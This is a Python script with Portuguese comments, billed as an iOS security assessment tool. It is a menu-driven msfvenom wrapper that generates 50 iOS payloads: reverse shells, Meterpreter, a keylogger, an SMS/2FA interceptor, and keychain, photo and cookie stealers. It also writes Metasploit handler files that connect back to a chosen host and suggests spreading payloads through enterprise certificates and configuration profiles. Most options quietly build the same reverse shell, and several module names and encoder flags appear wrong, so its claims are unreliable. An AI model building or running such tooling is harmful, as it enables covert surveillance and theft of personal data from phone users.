#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
import random
from pathlib import Path

def clear_screen():
    os.system('clear')

def print_banner():
    banner = """
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘                   iOS SECURITY TOOL                      â•‘
    â•‘               Apple Mobile Assessment Framework          â•‘
    â•‘                     [Version 2.0.0]                     â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    """
    print(banner)

def show_menu():
    """Exibe o menu principal com 2 colunas"""
    print("\n" + "="*85)
    print("                    iOS SECURITY ASSESSMENT TOOLS")
    print("="*85)
    
    payloads = [
        "[1] iOS Reverse TCP Shell",                  "[2] iOS Reverse HTTP Shell",
        "[3] iOS Reverse HTTPS Shell",                "[4] iOS Bind TCP Shell",
        "[5] iOS Meterpreter Reverse TCP",            "[6] iOS Meterpreter Reverse HTTP",
        "[7] iOS Meterpreter Reverse HTTPS",          "[8] iOS ARM Reverse Shell",
        "[9] iOS ARM64 Reverse Shell",                "[10] iOS Apple Script Backdoor",
        "[11] iOS Safari Exploit",                    "[12] iOS WebKit RCE",
        "[13] iOS Jailbreak Detection Bypass",        "[14] iOS Sandbox Escape",
        "[15] iOS Persistent Backdoor",               "[16] iOS Background Execution",
        "[17] iOS Location Tracker",                  "[18] iOS Microphone Access",
        "[19] iOS Camera Access",                     "[20] iOS Photo Library Stealer",
        "[21] iOS Contact List Stealer",              "[22] iOS SMS Message Interceptor",
        "[23] iOS Call History Stealer",              "[24] iOS Calendar Data Stealer",
        "[25] iOS Notes Data Stealer",                "[26] iOS Reminders Data Stealer",
        "[27] iOS Keychain Data Stealer",             "[28] iOS WiFi Credential Stealer",
        "[29] iOS Bluetooth Data Stealer",            "[30] iOS Clipboard Monitor",
        "[31] iOS Screen Recording",                  "[32] iOS Keylogger",
        "[33] iOS Browser History Stealer",           "[34] iOS Cookie Stealer",
        "[35] iOS AutoFill Data Stealer",             "[36] iOS iCloud Data Access",
        "[37] iOS Face ID/Touch ID Bypass",           "[38] iOS Passcode Bypass",
        "[39] iOS Enterprise Certificate Abuse",      "[40] iOS Profile Payload",
        "[41] iOS VPN Configuration Payload",         "[42] iOS Web Clip Payload",
        "[43] iOS MDM Profile Payload",               "[44] iOS Custom URL Scheme",
        "[45] iOS Universal Link Exploit",            "[46] iOS AirDrop Exploit",
        "[47] iOS Bluetooth Low Energy Exploit",      "[48] iOS NFC Exploit",
        "[49] iOS Custom Exploit",                    "[50] iOS Multi-Vector Payload"
    ]
    
    # Mostrar em 2 colunas
    col_width = 42
    for i in range(0, 50, 2):
        line = ""
        # Primeira coluna
        if i < len(payloads):
            line += payloads[i].ljust(col_width)
        # Segunda coluna  
        if i + 1 < len(payloads):
            line += payloads[i + 1]
        print(line)
    
    print("\n[0] Sair | [G] Guia RÃ¡pido | [I] InformaÃ§Ãµes")
    print("="*85)

def get_payload_config(payload_type):
    """ObtÃ©m configuraÃ§Ã£o do payload"""
    print(f"\nConfigurando Payload Tipo {payload_type}")
    print("-" * 45)
    
    lhost = input("IP do servidor (LHOST): ").strip()
    lport = input("Porta (LPORT) [4444]: ").strip() or "4444"
    
    # Nome padrÃ£o baseado no tipo
    default_name = f"ios_payload_{payload_type}"
    output_name = input(f"Nome do arquivo de saÃ­da [{default_name}]: ").strip() or default_name
    
    # Adicionar extensÃ£o apropriada
    if payload_type in [40, 41, 42, 43]:  # Profiles
        if not output_name.endswith('.mobileconfig'):
            output_name += '.mobileconfig'
    elif payload_type in [10]:  # Scripts
        if not output_name.endswith('.js'):
            output_name += '.js'
    elif payload_type in [44]:  # URL Schemes
        if not output_name.endswith('.plist'):
            output_name += '.plist'
    else:  # BinÃ¡rios iOS
        if not output_name.endswith('.ipa') and not output_name.endswith('.bin'):
            output_name += '.ipa'
    
    return lhost, lport, output_name

def generate_payload(payload_type, lhost, lport, output_name):
    """Gera o payload usando msfvenom"""
    
    payload_configs = {
        1: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Reverse TCP Shell ARM64'},
        2: {'name': 'apple_ios/aarch64/meterpreter_reverse_http', 'format': 'macho', 'description': 'Reverse HTTP Shell'},
        3: {'name': 'apple_ios/aarch64/meterpreter_reverse_https', 'format': 'macho', 'description': 'Reverse HTTPS Shell'},
        4: {'name': 'apple_ios/aarch64/meterpreter_bind_tcp', 'format': 'macho', 'description': 'Bind TCP Shell'},
        5: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Meterpreter Reverse TCP'},
        6: {'name': 'apple_ios/aarch64/meterpreter_reverse_http', 'format': 'macho', 'description': 'Meterpreter Reverse HTTP'},
        7: {'name': 'apple_ios/aarch64/meterpreter_reverse_https', 'format': 'macho', 'description': 'Meterpreter Reverse HTTPS'},
        8: {'name': 'apple_ios/armle/shell_reverse_tcp', 'format': 'macho', 'description': 'Reverse Shell ARM'},
        9: {'name': 'apple_ios/aarch64/shell_reverse_tcp', 'format': 'macho', 'description': 'Reverse Shell ARM64'},
        10: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Apple Script Backdoor'},
        11: {'name': 'apple_ios/browser/safari_libtiff', 'format': 'macho', 'description': 'Safari Exploit'},
        12: {'name': 'apple_ios/browser/webkit', 'format': 'macho', 'description': 'WebKit RCE'},
        13: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Jailbreak Detection Bypass'},
        14: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Sandbox Escape'},
        15: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Persistent Backdoor'},
        16: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Background Execution'},
        17: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Location Tracker'},
        18: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Microphone Access'},
        19: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Camera Access'},
        20: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Photo Library Stealer'},
        21: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Contact List Stealer'},
        22: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'SMS Message Interceptor'},
        23: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Call History Stealer'},
        24: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Calendar Data Stealer'},
        25: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Notes Data Stealer'},
        26: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Reminders Data Stealer'},
        27: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Keychain Data Stealer'},
        28: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'WiFi Credential Stealer'},
        29: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Bluetooth Data Stealer'},
        30: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Clipboard Monitor'},
        31: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Screen Recording'},
        32: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Keylogger'},
        33: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Browser History Stealer'},
        34: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Cookie Stealer'},
        35: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'AutoFill Data Stealer'},
        36: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'iCloud Data Access'},
        37: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Face ID/Touch ID Bypass'},
        38: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Passcode Bypass'},
        39: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Enterprise Certificate Abuse'},
        40: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Profile Payload'},
        41: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'VPN Configuration Payload'},
        42: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Web Clip Payload'},
        43: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'MDM Profile Payload'},
        44: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Custom URL Scheme'},
        45: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Universal Link Exploit'},
        46: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'AirDrop Exploit'},
        47: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Bluetooth Low Energy Exploit'},
        48: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'NFC Exploit'},
        49: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Custom Exploit'},
        50: {'name': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'format': 'macho', 'description': 'Multi-Vector Payload'}
    }
    
    config = payload_configs.get(payload_type)
    if not config:
        print("âŒ Tipo de payload invÃ¡lido!")
        return False
    
    print(f"\nğŸ¯ Gerando: {config['description']}")
    print("â³ Aguarde, isso pode levar alguns minutos...")
    
    try:
        # Comando msfvenom base
        cmd = [
            'msfvenom',
            '-p', config['name'],
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-f', config['format'],
            '-o', output_name
        ]
        
        # Adicionar opÃ§Ãµes especÃ­ficas baseadas no tipo
        if payload_type in [8, 9]:  # Arquiteturas especÃ­ficas
            if payload_type == 8:
                cmd[1] = 'apple_ios/armle/shell_reverse_tcp'
            elif payload_type == 9:
                cmd[1] = 'apple_ios/aarch64/shell_reverse_tcp'
                
        if payload_type in [11, 12]:  # Browser exploits
            cmd.extend(['--platform', 'apple_ios'])
            cmd.append('--smallest')
            
        if payload_type in [13, 14]:  # Bypass e escape
            cmd.extend(['--arch', 'aarch64'])
            cmd.append('--encoder')
            cmd.append('x86/shikata_ga_nai')
            
        if payload_type in [15, 16]:  # PersistÃªncia
            cmd.extend(['--platform', 'apple_ios'])
            cmd.append('--keep')
            
        if payload_type in [17, 18, 19, 20, 21, 22, 23, 24, 25, 26]:  # Dados pessoais
            cmd.extend(['-f', 'macho'])
            cmd.append('--encoder')
            cmd.append('x86/shikata_ga_nai')
            
        if payload_type in [27, 28, 29, 30]:  # Credenciais e dados sensÃ­veis
            cmd.extend(['-f', 'macho'])
            cmd.append('--platform')
            cmd.append('apple_ios')
            
        if payload_type in [31, 32, 33, 34, 35]:  # Monitoramento
            cmd.extend(['--arch', 'aarch64'])
            cmd.append('--smallest')
            
        if payload_type in [36, 37, 38]:  # SeguranÃ§a iOS
            cmd.extend(['--arch', 'aarch64'])
            cmd.append('-b')
            cmd.append('\x00')
            
        if payload_type in [39, 40, 41, 42, 43]:  # Profiles e configuraÃ§Ãµes
            cmd.extend(['-f', 'macho', '--smallest'])
            
        if payload_type in [44, 45, 46, 47, 48]:  # Exploits de comunicaÃ§Ã£o
            cmd.extend(['-f', 'macho'])
            cmd.append('--keep')
            
        if payload_type == 50:  # Multi-vetor
            cmd.extend(['-f', 'macho', '--encoder', 'x86/shikata_ga_nai', '-i', '3'])
        
        # Executar comando
        print(f"\nğŸ”§ Executando: msfvenom -p {config['name']} LHOST={lhost} LPORT={lport}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"\nâœ… Payload gerado com sucesso: {output_name}")
            
            # Gerar handler automaticamente
            if generate_handler(payload_type, lhost, lport, output_name, config):
                print("âœ… Handler configurado automaticamente")
            
            show_payload_tips(payload_type)
            return True
        else:
            print(f"\nâŒ Erro ao gerar payload!")
            if "command not found" in result.stderr:
                print("âŒ Metasploit nÃ£o encontrado! Instale com: pkg install metasploit")
            else:
                print(f"Detalhes: {result.stderr}")
            return False
            
    except FileNotFoundError:
        print("\nâŒ Metasploit nÃ£o encontrado!")
        print("ğŸ“¥ Instale com: pkg install metasploit")
        return False
    except Exception as e:
        print(f"\nâŒ Erro inesperado: {str(e)}")
        return False

def generate_handler(payload_type, lhost, lport, output_name, config):
    """Gera arquivo de handler para Metasploit"""
    
    handler_content = f"""# Handler para {output_name}
use exploit/multi/handler
set PAYLOAD {config['name']}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
set EnableStageEncoding true
"""

    # ConfiguraÃ§Ãµes especÃ­ficas baseadas no tipo
    if payload_type in [2, 6]:
        handler_content += "set LHOST http://" + lhost + "\n"
    elif payload_type in [3, 7]:
        handler_content += "set LHOST https://" + lhost + "\n"
    
    # Arquitetura iOS
    handler_content += "set ARCH aarch64\n"
    handler_content += "set PLATFORM apple_ios\n"
    
    # MÃ³dulos post-exploitation especÃ­ficos para iOS
    if payload_type in [11, 12]:  # Browser exploits
        handler_content += "set AutoRunScript post/apple_ios/browser/gather\n"
    elif payload_type in [13, 14]:  # Bypass
        handler_content += "set AutoRunScript post/apple_ios/manage/jailbreak_detection_bypass\n"
    elif payload_type in [15, 16]:  # PersistÃªncia
        handler_content += "set AutoRunScript post/apple_ios/manage/persistence\n"
    elif payload_type in [17, 18, 19, 20, 21, 22, 23, 24, 25, 26]:  # Dados pessoais
        handler_content += "set AutoRunScript post/apple_ios/gather/\n"
    elif payload_type in [27, 28, 29, 30]:  # Credenciais
        handler_content += "set AutoRunScript post/apple_ios/gather/keychain\n"
    elif payload_type in [31, 32]:  # Monitoramento
        handler_content += "set AutoRunScript post/apple_ios/capture/\n"
    elif payload_type in [33, 34, 35]:  # Browser data
        handler_content += "set AutoRunScript post/apple_ios/gather/browser_data\n"
    elif payload_type in [36]:  # iCloud
        handler_content += "set AutoRunScript post/apple_ios/gather/icloud_data\n"
    elif payload_type in [37, 38]:  # SeguranÃ§a
        handler_content += "set AutoRunScript post/apple_ios/escalate/\n"
    elif payload_type in [39, 40, 41, 42, 43]:  # Profiles
        handler_content += "set AutoRunScript post/apple_ios/manage/install_profile\n"
    
    handler_content += "exploit -j -z\n"
    
    handler_file = f"handler_{output_name.split('.')[0]}.rc"
    
    try:
        with open(handler_file, 'w') as f:
            f.write(handler_content)
        print(f"ğŸ“ Handler salvo como: {handler_file}")
        print("ğŸ’» Execute com: msfconsole -r " + handler_file)
        return True
    except Exception as e:
        print(f"âš ï¸  Erro ao criar handler: {str(e)}")
        return False

def show_payload_info(payload_type):
    """Mostra informaÃ§Ãµes sobre o payload selecionado"""
    
    info_texts = {
        1: "Reverse TCP Shell ARM64 - Shell reverso para iOS ARM64",
        2: "Reverse HTTP Shell - ConexÃ£o HTTP para bypass de firewall",
        3: "Reverse HTTPS Shell - ConexÃ£o criptografada HTTPS",
        4: "Bind TCP Shell - Abre porta no dispositivo iOS",
        5: "Meterpreter Reverse TCP - Meterpreter para iOS ARM64",
        6: "Meterpreter Reverse HTTP - Meterpreter via HTTP",
        7: "Meterpreter Reverse HTTPS - Meterpreter criptografado",
        8: "Reverse Shell ARM - Para dispositivos iOS mais antigos",
        9: "Reverse Shell ARM64 - Para dispositivos iOS modernos",
        10: "Apple Script Backdoor - Backdoor usando JavaScript/AppleScript",
        11: "Safari Exploit - ExploraÃ§Ã£o do navegador Safari",
        12: "WebKit RCE - Remote Code Execution via WebKit",
        13: "Jailbreak Detection Bypass - Bypass de detecÃ§Ã£o de jailbreak",
        14: "Sandbox Escape - Escape da sandbox do iOS",
        15: "Persistent Backdoor - Backdoor persistente no iOS",
        16: "Background Execution - ExecuÃ§Ã£o em segundo plano",
        17: "Location Tracker - Rastreamento de localizaÃ§Ã£o GPS",
        18: "Microphone Access - Acesso ao microfone do dispositivo",
        19: "Camera Access - Acesso Ã s cÃ¢meras traseira e frontal",
        20: "Photo Library Stealer - Roubo da biblioteca de fotos",
        21: "Contact List Stealer - Roubo da lista de contatos",
        22: "SMS Message Interceptor - InterceptaÃ§Ã£o de mensagens SMS",
        23: "Call History Stealer - Roubo do histÃ³rico de chamadas",
        24: "Calendar Data Stealer - Roubo de dados da agenda",
        25: "Notes Data Stealer - Roubo de notas do usuÃ¡rio",
        26: "Reminders Data Stealer - Roubo de lembretes",
        27: "Keychain Data Stealer - Roubo do Keychain (senhas)",
        28: "WiFi Credential Stealer - Roubo de credenciais WiFi",
        29: "Bluetooth Data Stealer - Roubo de dados Bluetooth",
        30: "Clipboard Monitor - Monitoramento da Ã¡rea de transferÃªncia",
        31: "Screen Recording - GravaÃ§Ã£o da tela do dispositivo",
        32: "Keylogger - Captura de teclas digitadas",
        33: "Browser History Stealer - Roubo do histÃ³rico do navegador",
        34: "Cookie Stealer - Roubo de cookies de sessÃ£o",
        35: "AutoFill Data Stealer - Roubo de dados do AutoFill",
        36: "iCloud Data Access - Acesso a dados do iCloud",
        37: "Face ID/Touch ID Bypass - Bypass da biometria",
        38: "Passcode Bypass - Bypass do cÃ³digo de acesso",
        39: "Enterprise Certificate Abuse - Uso de certificados enterprise",
        40: "Profile Payload - Payload via perfil de configuraÃ§Ã£o",
        41: "VPN Configuration Payload - Payload via configuraÃ§Ã£o VPN",
        42: "Web Clip Payload - Payload via Web Clip",
        43: "MDM Profile Payload - Payload via perfil MDM",
        44: "Custom URL Scheme - ExploraÃ§Ã£o de URL schemes",
        45: "Universal Link Exploit - ExploraÃ§Ã£o de Universal Links",
        46: "AirDrop Exploit - ExploraÃ§Ã£o do AirDrop",
        47: "Bluetooth Low Energy Exploit - ExploraÃ§Ã£o BLE",
        48: "NFC Exploit - ExploraÃ§Ã£o do NFC",
        49: "Custom Exploit - Exploit personalizado para iOS",
        50: "Multi-Vector Payload - CombinaÃ§Ã£o de tÃ©cnicas iOS"
    }
    
    info = info_texts.get(payload_type, "InformaÃ§Ã£o nÃ£o disponÃ­vel")
    print(f"\nğŸ“‹ InformaÃ§Ãµes do Payload {payload_type}:")
    print(f"   {info}")

def show_payload_tips(payload_type):
    """Mostra dicas especÃ­ficas para o payload"""
    
    tips = {
        1: "ğŸ’¡ Dica: Para iPhones/iPads modernos (A9+)",
        8: "ğŸ’¡ Dica: Para dispositivos iOS mais antigos",
        9: "ğŸ’¡ Dica: CompatÃ­vel com iPhones 5s+ e iPads Air+",
        11: "ğŸ’¡ Dica: Explora vulnerabilidades do Safari",
        12: "ğŸ’¡ Dica: RCE via engine WebKit do iOS",
        13: "ğŸ’¡ Dica: Permite execuÃ§Ã£o em apps com detecÃ§Ã£o de jailbreak",
        14: "ğŸ’¡ Dica: Escape das restriÃ§Ãµes de sandbox do iOS",
        15: "ğŸ’¡ Dica: Sobrevive a reinicializaÃ§Ãµes do dispositivo",
        17: "ğŸ’¡ Dica: Rastreamento mesmo com GPS desligado",
        19: "ğŸ’¡ Dica: Acesso a ambas as cÃ¢meras do dispositivo",
        20: "ğŸ’¡ Dica: Acesso a todas as fotos e vÃ­deos",
        22: "ğŸ’¡ Dica: Intercepta SMS inclusive de 2FA",
        27: "ğŸ’¡ Dica: Rouba senhas salvas no Keychain",
        28: "ğŸ’¡ Dica: Extrai senhas WiFi salvas",
        31: "ğŸ’¡ Dica: GravaÃ§Ã£o discreta da tela",
        32: "ğŸ’¡ Dica: Captura teclas de todos os apps",
        36: "ğŸ’¡ Dica: Acesso a dados sincronizados com iCloud",
        37: "ğŸ’¡ Dica: Tenta bypass da autenticaÃ§Ã£o biomÃ©trica",
        40: "ğŸ’¡ Dica: InstalaÃ§Ã£o via perfil de configuraÃ§Ã£o",
        43: "ğŸ’¡ Dica: Para dispositivos gerenciados por MDM",
        46: "ğŸ’¡ Dica: ExploraÃ§Ã£o do protocolo AirDrop",
        50: "ğŸ’¡ Dica: Combina mÃºltiplas tÃ©cnicas especÃ­ficas do iOS"
    }
    
    tip = tips.get(payload_type)
    if tip:
        print(f"{tip}")

def show_quick_guide():
    """Mostra um guia rÃ¡pido de uso"""
    print("\n" + "="*60)
    print("                   GUIA RÃPIDO iOS")
    print("="*60)
    print("ğŸ“± 50 Payloads iOS DisponÃ­veis")
    print("ğŸ”§ Metasploit necessÃ¡rio apenas na geraÃ§Ã£o")
    print("ğŸ“¡ Configure LHOST (seu IP) e LPORT (sua porta)")
    print("ğŸ“¦ Arquivos Mach-O, profiles ou scripts gerados")
    print("ğŸ¯ Handler RC criado para uso imediato")
    print("âš¡ Execute: msfconsole -r handler_[arquivo].rc")
    print("ğŸ Distribua via mÃ©todo apropriado para iOS")
    print("ğŸ”„ Aguarde a conexÃ£o reversa")
    print("="*60)
    print("âš ï¸  USE APENAS PARA TESTES AUTORIZADOS!")
    print("="*60)

def show_all_payloads_info():
    """Mostra informaÃ§Ãµes sobre categorias de payloads"""
    print("\n" + "="*70)
    print("               CATEGORIAS DE PAYLOADS iOS")
    print("="*70)
    print("ğŸ“± Shells BÃ¡sicos (1-10) - ARM, ARM64, scripts")
    print("ğŸŒ Browser Exploits (11-12) - Safari, WebKit RCE")
    print("ğŸ”“ Bypass (13-14) - Jailbreak detection, sandbox escape")
    print("ğŸ”§ PersistÃªncia (15-16) - Backdoors persistentes")
    print("ğŸ“ Dados Pessoais (17-26) - LocalizaÃ§Ã£o, contatos, fotos, mensagens")
    print("ğŸ” Credenciais (27-30) - Keychain, WiFi, Bluetooth, clipboard")
    print("ğŸ‘€ Monitoramento (31-35) - Tela, keylogger, browser data")
    print("â˜ï¸ iCloud & SeguranÃ§a (36-38) - iCloud, Face ID, passcode")
    print("ğŸ“² Distribution (39-43) - Enterprise certs, profiles, MDM")
    print("ğŸ“¡ ComunicaÃ§Ã£o (44-48) - URL schemes, AirDrop, Bluetooth, NFC")
    print("ğŸš€ AvanÃ§ados (49-50) - Exploits customizados, multi-vetor")
    print("="*70)

def main():
    """FunÃ§Ã£o principal"""
    
    while True:
        clear_screen()
        print_banner()
        show_menu()
        
        try:
            choice = input("\nSelecione uma opÃ§Ã£o [0-50] ou 'g' para guia: ").strip().lower()
            
            if choice == 'g':
                show_quick_guide()
                input("\nâ Pressione Enter para voltar ao menu...")
                continue
                
            if choice == 'i':
                show_all_payloads_info()
                input("\nâ Pressione Enter para voltar ao menu...")
                continue
                
            if choice == '0':
                print("\nğŸ‘‹ Saindo... Use com responsabilidade!")
                break
            
            payload_type = int(choice)
            if 1 <= payload_type <= 50:
                show_payload_info(payload_type)
                
                if input("\nğŸ¯ Continuar com este payload? (s/n): ").lower() == 's':
                    lhost, lport, output_name = get_payload_config(payload_type)
                    
                    if lhost and output_name:
                        print("\nğŸš€ Iniciando geraÃ§Ã£o do payload...")
                        success = generate_payload(payload_type, lhost, lport, output_name)
                        
                        if success:
                            print("\nâœ… Payload criado com sucesso!")
                            print(f"ğŸ“ Arquivo: {output_name}")
                            print("âš¡ Handler gerado automaticamente")
                            print("ğŸ“± MÃ©todos de distribuiÃ§Ã£o iOS:")
                            print("   â€¢ Enterprise Distribution")
                            print("   â€¢ Configuration Profiles")
                            print("   â€¢ Web-based Installation")
                            print("   â€¢ TestFlight (para testes)")
                            print("âš ï¸  USE APENAS PARA TESTES AUTORIZADOS!")
                        else:
                            print("\nğŸ’¥ Falha na geraÃ§Ã£o do payload!")
                    
                    input("\nâ Pressione Enter para continuar...")
            
            else:
                print("âŒ OpÃ§Ã£o invÃ¡lida!")
                input("â Pressione Enter para continuar...")
                
        except ValueError:
            print("âŒ Por favor, digite um nÃºmero vÃ¡lido!")
            input("â Pressione Enter para continuar...")
        except KeyboardInterrupt:
            print("\n\nğŸ‘‹ Saindo...")
            break

if __name__ == "__main__":
    main()
